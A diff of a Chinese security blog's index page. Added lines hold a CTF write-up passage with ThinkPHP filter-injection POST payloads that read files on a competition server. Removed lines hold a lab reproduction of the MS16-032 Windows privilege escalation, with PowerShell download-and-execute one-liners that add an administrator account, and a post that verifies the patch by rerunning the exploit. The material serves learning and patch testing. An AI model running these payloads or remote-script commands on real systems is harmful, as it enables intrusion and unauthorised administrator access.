+<p>试一下<code>scandir()</code>和<code>var_dump()</code>，扫描当前目录，直接出结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：http://183.129.189.62:19403/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST：_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=.</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-4.png" alt="1-4"></p>
+<p>然后在<code>根目录</code>下找到<code>flag</code>字样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：http://183.129.189.62:19403/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST：_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=../../../</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-5.png" alt="1-5"></p>
+<p>直接读取内容，拿下 flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：http://183.129.189.62:19403/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST：_method=__construct&amp;method=get&amp;filter[]=readfile&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=../../../flag</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/1-6.png" alt="1-6"></p>
+<h2 id="something-in-image"><a href="#something-in-image" class="headerlink" title="something in image"></a>something in image</h2><p>解压下来一个名为<code>badimages</code>的文件，直接拿到 fl</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings badimages | grep -i flag</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/2-1.png" alt="2-1"></p>
+<h2 id="EzMemory"><a href="#EzMemory" class="headerlink" title="EzMemory"></a>EzMemory</h2><p>文件有点大，但是跟上一题一样，还是直接拿下 flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings mem.raw | grep -i flag&#123;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/湖湘杯复赛/3-1.png" alt="3-1"></p>
 
       
 
@@ -600,7 +632,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/10/30/上海CTF Write Up/">展开全文 >></a>
+          <a class="article-more-a" href="/Knlvre.github-io/2019/11/01/2019年11月份 CTF Write Up 集合/">展开全文 >></a>
         </p>
       
 
@@ -1172,227 +1204,6 @@
 
 
   
-    <article id="post-MS16-032（CVE-2016-0099）复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/10/04/MS16-032（CVE-2016-0099）复现/">MS16-032（CVE-2016-0099）复现</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/10/04/MS16-032（CVE-2016-0099）复现/" class="archive-article-date">
-  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>漏洞类型：特权提升</p>
-<p>Microsoft 安全公告：<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032</a></p>
-<p>exploit-db的详情：<a href="https://www.exploit-db.com/exploits/39574/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/39574/</a></p>
-<p>利用时需要满足的要求</p>
-<blockquote>
-<p>①系统需要拥有至少2个的CPU核心</p>
-<p>②Power shell v2.0以及更高的版本</p>
-</blockquote>
-<p>影响的Windwos版本</p>
-<blockquote>
-<p>Windows Vista、Windows 7、Windows 2008 Server、Windows 2012 Server、Windows 8.1、Windows 10</p>
-</blockquote>
-<p>本次复现的版本为Windows 7，其他的没有再去复现</p>
-<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>虚拟机平台：VMware Workstation Pro</p>
-<p>测试机：Windows 7</p>
-<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>测试一：普通用户登录下，获取管理员cmd</p>
-<p>脚本地址：<a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1" target="_blank" rel="noopener">1_Invoke-MS16-032.ps1</a></p>
-<p>创建文件的方法有多种，这里演示两种：</p>
-<p>①创建文件<code>1_Invoke-MS16-032.ps1</code>并写入内容；</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;type nul &gt; 1_Invoke-MS16-032.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;notepad 1_Invoke-MS16-032.ps1	#写入内容</span><br></pre></td></tr></table></figure>
-<p>②用之前提到的powershell脚本直接下载文件</p>
-<p>Ps：可以参考我之前转载的文章：<a href="https://knlvre.github.io/Knlvre.github-io/2019/10/04/%E5%8D%81%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/">十三种方式下载文件</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;type nul &gt; download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;notepad download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;type download.ps1</span><br><span class="line">$p = New-Object System.Net.WebClient</span><br><span class="line">$p.DownloadFile(&quot;https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1&quot;,&quot;E:\MS16-032\1_Invoke-MS16-032.ps1&quot;)</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;dir</span><br><span class="line">2019/10/04  03:08    &lt;DIR&gt;          .</span><br><span class="line">2019/10/04  03:08    &lt;DIR&gt;          ..</span><br><span class="line">2019/10/04  03:08               184 download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; . .\download.ps1</span><br><span class="line">PS E:\MS16-032&gt; dir</span><br><span class="line">Mode                LastWriteTime     Length Name</span><br><span class="line">----                -------------     ------ ----</span><br><span class="line">-a---         2019/10/4      3:08      11460 1_Invoke-MS16-032.ps1</span><br><span class="line">-a---         2019/10/4      3:08        184 download.ps1</span><br></pre></td></tr></table></figure>
-<p>文件下载好之后，先展示一下当前用户，以及属组</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;whoami</span><br><span class="line">win...\test</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user  test</span><br><span class="line">用户名                 test</span><br><span class="line">...</span><br><span class="line">可允许的登录小时数     All</span><br><span class="line"></span><br><span class="line">本地组成员             *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
-<p>无权的一个用户，现在开始执行脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; . .\1_Invoke-MS16-032.ps1</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; Invoke-MS16-032</span><br><span class="line">         __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">        |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">        |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">        |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                       [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handle</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
-<p>执行完之后，直接拿到管理员的cmd</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/ms16_032-1.png" alt="1-1"></p>
-<p>前面的步骤时进入powershell在执行命令，但其实可以加一个<code>-c</code>参数，后面可以直接接命令，分号分隔开，然后就会自动执行，不用进入powershell。当然，这是根据个人喜好，进入powershell之后还有tab自动补全等功能</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -exec bypass -c &quot;. .\1_Invoke-MS16-032.ps1;Invoke-MS16-032&quot;</span><br><span class="line">         __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">        |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">        |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">        |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                       [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handle</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
-<hr>
-<p>测试二：普通用户登录下，创建其他用户，并加入<code>administrators</code>组</p>
-<p>脚本地址：<a href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1" target="_blank" rel="noopener">2_Invoke-MS16-032.ps1</a></p>
-<p>Ps：相对于测试一的脚本，该脚本进行了简单改变，可以执行任意程序，并可以添加参数执行（全程无弹框）。<code>-Application</code>参数可以执行任意程序</p>
-<p>先看一下权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;whoami</span><br><span class="line">win...\test</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user test_test /add</span><br><span class="line">发生系统错误 5。</span><br><span class="line"></span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>
-<p>在这里又学了一招，不用下载文件，直接远程利用脚本，不用下载到本地（当然也可以像之前那样）。现在开始执行脚本，直接试一下添加用户：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user test_test test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    HSW</span><br><span class="line">test                     test_test</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user test_test</span><br><span class="line">用户名                 test_test</span><br><span class="line">...</span><br><span class="line">本地组成员             *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
-<p>可以看到<code>test_test</code>用户添加完成，但是只属于<code>Users组</code>，现在将其加入<code>Administrators组</code>，先查看一下组和权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;net localgroup Administrators</span><br><span class="line">别名     Administrators</span><br><span class="line">注释     管理员对计算机/域有不受限制的完全访问权</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">----------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net localgroup Administrators test_test /add</span><br><span class="line">发生系统错误 5。</span><br><span class="line"></span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>
-<p>然后执行脚本并验证</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net localgroup Administrators test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net localgroup Administrators</span><br><span class="line">别名     Administrators</span><br><span class="line">注释     管理员对计算机/域有不受限制的完全访问权</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">---------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">test_test</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user test_test</span><br><span class="line">用户名                 test_test</span><br><span class="line">...</span><br><span class="line">本地组成员             *Administrators       *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
-<hr>
-<p>参考文章</p>
-<p><a href="https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html" target="_blank" rel="noopener">https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/MS16-032（CVE-2016-0099）复现/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Windows系统添加补丁" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/">Windows系统添加补丁</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/" class="archive-article-date">
-  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p># </p>
-<h1 id="补丁下载"><a href="#补丁下载" class="headerlink" title="补丁下载"></a>补丁下载</h1><p>各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到<code>Microsoft</code>的官网去查看和下载：<a href="https://docs.microsoft.com/zh-cn/security-updates/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/</a></p>
-<p>点击左边栏的<code>Security Bulletins</code>可以查找想要看的漏洞</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-1.png" alt="1"></p>
-<p>这里以打<code>MS16-032（CVE-2016-0099）</code>的补丁为例：左边栏找到<code>MS16-032</code>，找到系统对应版本</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-2.png" alt="2"></p>
-<p>在跳转页面后，点击<code>Download</code>，下载</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-3.png" alt="3"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-4.png" alt="4"></p>
-<h1 id="补丁安装"><a href="#补丁安装" class="headerlink" title="补丁安装"></a>补丁安装</h1><p>Windows系统自带补丁安装程序：<code>wusa</code>。命令行执行<code>wusa.exe</code>可以弹出使用帮助</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-5.png" alt="5"></p>
-<p>命令行安装补丁（要制定完整的文件地址，不能是相对地址）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;wusa E:\MS16-032\Windows6.1-KB3139914-x64.msu</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-6.png" alt="6"></p>
-<p>补丁安装完成需要<code>重启计算机才能生效</code>。重启完之后，看一下补丁的安装情况。可以看到<code>KB3139914</code>已经安装了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;systeminfo</span><br><span class="line">...</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">修补程序:         安装了 5 个修补程序。</span><br><span class="line">                  [01]: KB2534111</span><br><span class="line">                  [02]: KB2999226</span><br><span class="line">                  [03]: KB3139914</span><br><span class="line">                  [04]: KB958488</span><br><span class="line">                  [05]: KB976902</span><br><span class="line">...</span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
-<p>当前系统存在的用户</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;net user</span><br><span class="line"></span><br><span class="line">\\WIN... 的用户帐户</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------</span><br><span class="line">Administrator            Guest                    HSW</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
-<p>执行<code>MS16-032（CVE-2016-0099）</code>的脚本，可以参考之前这篇文章：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user test_test test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">[!] No valid thread handles were captured, exiting!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
-<p>从结果可以看出，已经无法成功执行，说明我们打的补丁已经生效了</p>
-<h1 id="补丁卸载"><a href="#补丁卸载" class="headerlink" title="补丁卸载"></a>补丁卸载</h1><p>命令行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;wusa /uninstall /kb:3139914</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-7.png" alt="7"></p>
-<p>卸载完成之后需要重启。重启后我们再次查看补丁列表，已经没有了<code>KB3139914</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;systeminfo</span><br><span class="line">...</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">修补程序:         安装了 5 个修补程序。</span><br><span class="line">                  [01]: KB2534111</span><br><span class="line">                  [02]: KB2999226</span><br><span class="line">                  [03]: KB958488</span><br><span class="line">                  [04]: KB976902</span><br><span class="line">...</span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
-<p>试一下执行<code>MS16-032（CVE-2016-0099）</code>的脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user test_test test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user</span><br><span class="line"></span><br><span class="line">\\WIN... 的用户帐户</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------</span><br><span class="line">Administrator            Guest                    HSW</span><br><span class="line">test_test</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
-<p>脚本又能执行成功了，说明我们成功卸载补丁</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
